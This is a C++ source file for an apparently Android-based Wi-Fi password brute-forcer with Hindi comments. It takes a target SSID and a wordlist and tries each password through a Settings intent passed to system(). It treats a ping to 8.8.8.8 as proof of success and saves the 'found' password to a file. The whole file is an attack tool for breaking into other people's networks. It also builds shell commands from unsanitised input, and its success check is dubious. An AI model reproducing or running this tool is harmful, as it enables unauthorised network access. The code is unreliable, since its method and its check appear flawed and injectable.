#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>
#include <vector>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// बिना रूट के कनेक्शन चेक करने का प्रयास
bool autoCheck() {
    // 'dumpsys' बिना रूट के सीमित जानकारी देता है, लेकिन हम 'ping' से चेक कर सकते हैं
    cout << YELLOW << " [Checking Internet Connection...]" << RESET << flush;
    int res = system("ping -c 1 -W 2 8.8.8.8 > /dev/null 2>&1");
    return (res == 0);
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (NON-ROOT AUTO)      " << endl;
    cout << "===========================================" << RESET << endl;

    string ssid, wordlist;
    cout << CYAN << "\nEnter Target SSID: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, wordlist);

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist file nahi mili!" << RESET << endl;
        return 1;
    }

    // --- Features Note ---
    cout << RED << "\n[!] Deauth/Cloning requires Monitor Mode (Root Only)." << RESET << endl;
    cout << YELLOW << "[*] Running Auto-Brute Mode..." << RESET << endl;

    string pass;
    int line_count = 0;
    bool success = false;

    while (getline(file, pass)) {
        line_count++;
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "] TRYING: " << pass << flush;

        /* 
           Non-Root "Action Connect" Intent: 
           यह सेटिंग्स को कमांड देता है कि इस नेटवर्क को इस पासवर्ड के साथ सेव करे।
        */
        string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
        system(cmd.c_str());

        // Android को कनेक्ट होने के लिए समय चाहिए
        cout << " ...waiting 10s..." << flush;
        sleep(10); 

        if (autoCheck()) {
            cout << GREEN << BOLD << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << "\n[+] Sahi Password Mil Gaya: " << pass << RESET << endl;
            
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break;
        } else {
            cout << RED << " >> [FAILED/TIMEOUT]" << RESET << endl;
        }
    }

    if (!success) cout << RED << "\n[-] Attack complete. Password nahi mila." << RESET << endl;

    file.close();
    return 0;
}
